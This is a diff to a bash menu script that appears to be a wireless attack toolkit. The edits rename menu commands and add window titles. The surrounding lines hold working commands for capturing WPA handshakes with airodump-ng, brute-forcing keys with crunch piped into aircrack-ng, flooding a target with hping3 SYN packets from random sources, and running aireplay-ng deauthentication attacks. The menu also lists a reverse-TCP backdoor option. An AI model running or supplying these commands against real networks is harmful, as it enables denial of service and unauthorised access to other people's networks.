@@ -79,15 +79,15 @@ echo -e "\e[1;35m "
 echo    ---------------
 echo     clear : clear 
 echo '  ---------------------------------------------------------------------  '
-echo '  [+] monitoring mode : monitor      | [+] sniffing : sniff  '
+echo '  [+] monitoring mode : monitor      | [+] sniffing : sniff              '
 echo '  ---------------------------------------------------------------------  '
-echo '  [+] network scan : nc              | [+] crack handshake : crh   '
+echo '  [+] network scan : nc              | [+] crack handshake : crack       '
 echo '  ---------------------------------------------------------------------  '
-echo '  [+] ports scan : pscan (nmap)      | [+] Deauthentication Attack : da     '
+echo '  [+] ports scan : pscan (nmap)      | [+] Deauthentication Attack : da  '
 echo '  ---------------------------------------------------------------------  '
-echo '  [+] denial of service : dos        | [+] backdoor reverse_tcp: backd          '
+echo '  [+] denial of service : dos        | [+] backdoor reverse_tcp: backd   '
 echo '  ---------------------------------------------------------------------  '
-echo '  [+] retrival of handshake : crack     '
+echo '  [+] retrival of handshake : rtvh      '
 echo '  ------------------------------------  '
 echo '  [+] install dependances :ind          '
 echo '  ------------------------------------  '
@@ -144,7 +144,7 @@ fi
 
 
 
-if [ $choix = "crack" ]
+if [ $choix = "rtvh" ]
 then
 clear
 read -p 'interface : ' winterface
@@ -157,7 +157,7 @@ echo
 echo -e ' \e[1;31m '
 read -p 'bssid: ' apbssid
 read -p 'chanel : ' apch
-xterm -e airodump-ng -c $apch --bssid $apbssid -w gs-tool.cap $winterface | xterm -e airodump-ng $winterface
+xterm -title crack -e airodump-ng -c $apch --bssid $apbssid -w gs-tool.cap $winterface | xterm -e airodump-ng $winterface
 clear
 
 fi
@@ -185,7 +185,7 @@ echo -------------
 echo port ex: 53
 echo -------------
 read -p ' port : ' portdos
-xterm -e hping3 -c 100000 -d 120 -S -w 64 -p $portdos --flood --rand-source $ipdos
+xterm -title DOS -e hping3 -c 100000 -d 120 -S -w 64 -p $portdos --flood --rand-source $ipdos
 fi
 
 
@@ -250,7 +250,7 @@ fi
 
 
 
-if [ $choix = "crh" ]
+if [ $choix = "crack" ]
 then
 clear
 echo ------------------
@@ -260,11 +260,11 @@ echo ------------------
 echo file.cap
 read -p 'file : ' capcr
 echo
-echo bssid of ap
+echo bssid of acces point
 echo
 read -p 'bssid : ' bssidcr
 echo
-echo wep :1  or wpa:2
+echo wep   or wpa
 echo
 read -p 'sercurity : ' ecript
 crunch 8 25 azertyuioqsdfghjklmwxcvbn01234567890 | aircrack-ng -w - -b $bssidcr -a $ecript $capcr
@@ -308,7 +308,7 @@ read -p ' interface : ' interfaceda
 clear
 echo -e  '\e[1;32m '
 echo attack started ... 
-xterm -e aireplay-ng -0 122222 -a $bssidda -c $macda $interfaceda
+xterm -title"Deauthentication-Attack" -e aireplay-ng -0 122222 -a $bssidda -c $macda $interfaceda | xterm -title "Deauthentication-Attack" -e airodump-ng
 fi
 
 
